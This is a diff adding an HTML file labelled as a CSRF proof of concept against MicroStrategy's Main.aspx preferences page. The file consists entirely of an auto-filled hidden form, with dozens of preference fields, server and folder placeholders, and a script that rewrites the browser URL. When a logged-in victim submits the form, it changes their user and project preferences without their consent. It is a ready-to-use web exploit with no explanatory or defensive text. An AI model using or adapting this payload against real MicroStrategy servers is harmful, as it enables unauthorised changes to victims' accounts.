@@ -1,0 +1,64 @@
+<html>
+  <!-- CSRF PoC by Wissam -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://#Server_Name/microstrategy/asp/Main.aspx" method="POST">
+      <input type="hidden" name="startPage" value="3059" />
+      <input type="hidden" name="startPageName" value="" />
+      <input type="hidden" name="colorTheme" value="Red" />
+      <input type="hidden" name="locale" value="&#45;1" />
+      <input type="hidden" name="25009" value="DHTML&#32;Hidden&#32;Button" />
+      <input type="hidden" name="localeMD" value="1033" />
+      <input type="hidden" name="localeWHD" value="&#45;1" />
+      <input type="hidden" name="sLoc" value="&#45;1" />
+      <input type="hidden" name="localeMsgs" value="&#45;1" />
+      <input type="hidden" name="units" value="6" />
+      <input type="hidden" name="timeZone" value="0" />
+      <input type="hidden" name="useDHTML" value="3" />
+      <input type="hidden" name="accessibility" value="0" />
+      <input type="hidden" name="ddMenu" value="1" />
+      <input type="hidden" name="ddMenu" value="0" />
+      <input type="hidden" name="hierarchicalSort" value="2" />
+      <input type="hidden" name="fontFamilyOption" value="0" />
+      <input type="hidden" name="fontFamily" value="Tahoma&#44;Arial&#44;Verdana&#44;Microsoft&#32;Sans&#32;Serif" />
+      <input type="hidden" name="availableFonts" value="Garamond" />
+      <input type="hidden" name="fontSizeOption" value="0" />
+      <input type="hidden" name="fontSize" value="8" />
+      <input type="hidden" name="exportReuseNewWindow" value="0" />
+      <input type="hidden" name="fullScreenModeReports" value="2" />
+      <input type="hidden" name="fullScreenModeDocuments" value="2" />
+      <input type="hidden" name="cartItemKeptInCartAvailable" value="0" />
+      <input type="hidden" name="MQDefaultOperator" value="10&#44;1" />
+      <input type="hidden" name="AQHQDefaultOperator" value="6&#44;1" />
+      <input type="hidden" name="promptsPreserveWhiteSpace" value="0" />
+      <input type="hidden" name="autoExpandAttributeInHierarchy" value="1" />
+      <input type="hidden" name="autoExpandAttributeInHierarchy" value="0" />
+      <input type="hidden" name="askBeforeSaveChanges" value="1" />
+      <input type="hidden" name="showAdvancedSaveOptions" value="0" />
+      <input type="hidden" name="saveAsAdvKeepPrompt1" value="2" />
+      <input type="hidden" name="saveAsKeepPromptAnswers1" value="1" />
+      <input type="hidden" name="saveAsKeepPromptAnswers1" value="0" />
+      <input type="hidden" name="copyNameTranslations" value="0" />
+      <input type="hidden" name="askBeforeLinkedDEsChanges" value="1" />
+      <input type="hidden" name="askBeforeLinkedDEsChanges" value="0" />
+      <input type="hidden" name="showFeedback" value="1" />
+      <input type="hidden" name="showFeedback" value="0" />
+      <input type="hidden" name="showHomeBtnInNavBar" value="0" />
+      <input type="hidden" name="showFolderUpBtnInNavBar" value="0" />
+      <input type="hidden" name="FinancialReporting" value="2" />
+      <input type="hidden" name="defaultevtlist" value="25003" />
+      <input type="hidden" name="allProjects" value="1" />
+      <input type="hidden" name="25003" value="Apply" />
+      <input type="hidden" name="evt" value="25008" />
+      <input type="hidden" name="src" value="Main&#46;aspx&#46;prefs&#46;preferences&#46;25008" />
+      <input type="hidden" name="evt" value="25003" />
+      <input type="hidden" name="src" value="Main&#46;aspx&#46;prefs&#46;preferences&#46;25003" />
+      <input type="hidden" name="level" value="user&#95;project" />
+      <input type="hidden" name="Main&#46;aspx" value="&#45;&#42;&#45;zswfOVGQte09Qc4Rfblzl1etbRI&#61;&#46;<<FOLDER_NAME>>&#46;&#42;&#45;oilcyzXLwLKn&#42;&#45;PSX&#95;" />
+      <input type="hidden" name="prefs" value="&#42;&#45;1&#46;&#42;&#45;1&#46;0&#46;0&#46;0" />
+      <input type="hidden" name="preferences" value="&#42;&#45;1&#46;&#42;&#45;1&#46;0&#46;0&#46;user&#46;general&#46;&#46;&#46;1&#42;&#46;3B585AFB5E07429A9A79B10EED67636D&#42;&#42;&#42;&#46;Financial&#32;Reporting&#42;&#42;&#42;&#46;Hierarchy&#32;reports&#32;are&#32;easy&#32;to&#32;create&#32;using&#32;a&#32;new&#32;Attribute&#32;type&#58;&#32;the&#32;Hierarchical&#32;Attribute&#44;&#32;which&#32;represents&#32;an&#32;entire&#32;hierarchy&#32;and&#32;its&#32;levels&#42;&#42;&#42;&#42;&#42;&#42;&#42;&#46;&#32;ï&#191;&#189;Â&#160;In&#32;10&#42;&#42;&#42;&#42;&#42;&#42;&#42;&#46;4&#44;&#32;this&#32;feature&#32;is&#32;supported&#32;against&#32;Microsoft&#32;Analysis&#32;Services&#32;and&#32;Essbase&#42;&#42;&#42;&#42;&#42;&#42;&#42;&#46;&#42;&#42;&#42;&#46;&#42;&#42;&#42;&#46;0&#42;&#42;&#42;&#46;2&#42;&#42;&#42;&#46;0&#42;&#46;5E594D084ADACCF058DEADA000259E2F&#42;&#42;&#42;&#46;featureflagSample&#42;&#42;&#42;&#46;A&#32;sample&#32;FeatureFlag&#32;object&#42;&#42;&#42;&#46;This&#32;is&#32;an&#32;example&#32;of&#32;feature&#32;flag&#32;object&#32;which&#32;is&#32;used&#32;for&#32;developing&#32;and&#32;debugging&#32;purpose&#42;&#42;&#42;&#42;&#42;&#42;&#42;&#46;&#32;Please&#32;do&#32;not&#32;use&#32;it&#32;to&#32;control&#32;feature&#42;&#42;&#42;&#42;&#42;&#42;&#42;&#46;&#42;&#42;&#42;&#46;1&#42;&#42;&#42;&#46;1&#42;&#42;&#42;&#46;1&#46;1&#46;" />
+      <input type="hidden" name="prefTb" value="&#42;&#45;1&#46;&#42;&#45;1&#46;0&#46;0&#46;" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
